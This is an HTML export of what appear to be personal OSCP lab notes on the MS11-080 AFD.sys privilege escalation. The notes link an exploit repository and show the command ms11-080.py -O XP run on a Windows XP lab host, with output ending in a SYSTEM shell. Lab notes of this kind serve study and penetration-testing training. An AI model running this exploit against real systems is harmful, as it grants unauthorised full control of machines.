<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MS11-080</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># MS11-080</h1></strong><br /><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS11-080%20-%20AFD.sys">https://github.com/abatchy17/WindowsExploits/tree/master/MS11-080%20-%20AFD.sys</a><br /><br /><strong>Examples</strong><br />• oscp 10.2.2.86 - John<br />   ◇ Windows XP Pro SP3 32-bit<br /><br /><div class="codebox"><div class="codebox">C:\Documents&nbsp;and&nbsp;Settings\john\Desktop&gt;c:\python27\python.exe&nbsp;ms11-080.py&nbsp;-O&nbsp;XP<br />[&gt;]&nbsp;MS11-080&nbsp;Privilege&nbsp;Escalation&nbsp;Exploit<br />[&gt;]&nbsp;Matteo&nbsp;Memelli&nbsp;-&nbsp;ryujin@offsec.com<br />[&gt;]&nbsp;Release&nbsp;Date&nbsp;28/11/2011<br />[+]&nbsp;Retrieving&nbsp;Kernel&nbsp;info...<br />[+]&nbsp;Kernel&nbsp;version:&nbsp;ntkrnlpa.exe<br />[+]&nbsp;Kernel&nbsp;base&nbsp;address:&nbsp;0x804d7000L<br />[+]&nbsp;HalDispatchTable&nbsp;address:&nbsp;0x80545838L<br />[+]&nbsp;Retrieving&nbsp;hal.dll&nbsp;info...<br />[+]&nbsp;hal.dll&nbsp;base&nbsp;address:&nbsp;0x806d0000L<br />[+]&nbsp;HaliQuerySystemInformation&nbsp;address:&nbsp;0x806e6bbaL<br />[+]&nbsp;HalpSetSystemInformation&nbsp;address:&nbsp;0x806e9436L<br />[*]&nbsp;Triggering&nbsp;AFDJoinLeaf&nbsp;pointer&nbsp;overwrite...<br />[*]&nbsp;Spawning&nbsp;a&nbsp;SYSTEM&nbsp;shell...<br /><br />C:\WINDOWS\system32&gt;whoami<br />SYSTEM</div></div></div>
</body>
</html>
